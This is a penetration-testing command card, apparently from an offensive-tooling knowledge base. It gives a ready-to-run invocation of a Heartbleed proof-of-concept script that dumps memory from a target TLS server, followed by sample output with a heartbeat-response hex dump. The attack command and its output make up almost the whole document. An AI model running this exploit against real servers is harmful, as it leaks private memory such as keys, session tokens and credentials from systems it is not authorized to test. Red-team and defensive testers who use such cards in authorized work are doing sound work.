---
id: 52e50b46-122c-4873-9442-f83234e9f7d5
name: Heartbleed Dump Vulnerable Memory of a Server
type: command
executor: bash
data: python2 heartbleed-poc.py $_TARGET_IP -n 5 -f $_OUTPUT.txt
output: "root@kali:~# python heartbleed-poc.py 10.10.10.10 -n 1 -f output.txt\nScanning\
  \ 10.10.10.10 on port 443\nConnecting...\nSending Client Hello...\nWaiting for Server\
  \ Hello...\n ... received message: type = 22, ver = 0302, length = 66\n ... received\
  \ message: type = 22, ver = 0302, length = 885\n ... received message: type = 22,\
  \ ver = 0302, length = 331\n ... received message: type = 22, ver = 0302, length\
  \ = 4\nServer TLS version was 1.2\n\nSending heartbeat request...\n ... received\
  \ message: type = 24, ver = 0302, length = 16384\nReceived heartbeat response:\n\
  \  0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...\n  0010:\
  \ BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......\n  0020: 9F\
  \ 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....\".\n  0030: 21 00\
  \ 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.\n  0040: 84 C0 12\
  \ C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................\n  0050: 03 00 0A C0\
  \ 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.\n  0060: 9A 00 99 00 45\
  \ 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...\n  0070: 41 C0 11 C0 07 C0\
  \ 0C C0 02 00 05 00 04 00 15 00  A...............\n  0080: 12 00 09 00 14 00 11\
  \ 00 08 00 06 00 03 00 FF 01  ................\n  0090: 00 00 49 00 0B 00 04 03\
  \ 00 01 02 00 0A 00 34 00  ..I...........4.\n...\n..."
created_at: '2019-11-22T19:31:39.485937+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
tools:
- '[[heartbleed-poc]]'
- '[[type]]'
---

# Heartbleed Dump Vulnerable Memory of a Server

```bash
python2 heartbleed-poc.py $_TARGET_IP -n 5 -f $_OUTPUT.txt
```

## Expected Output

```
root@kali:~# python heartbleed-poc.py 10.10.10.10 -n 1 -f output.txt
Scanning 10.10.10.10 on port 443
Connecting...
Sending Client Hello...
Waiting for Server Hello...
 ... received message: type = 22, ver = 0302, length = 66
 ... received message: type = 22, ver = 0302, length = 885
 ... received message: type = 22, ver = 0302, length = 331
 ... received message: type = 22, ver = 0302, length = 4
Server TLS version was 1.2

Sending heartbeat request...
 ... received message: type = 24, ver = 0302, length = 16384
Received heartbeat response:
  0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
...
...
```


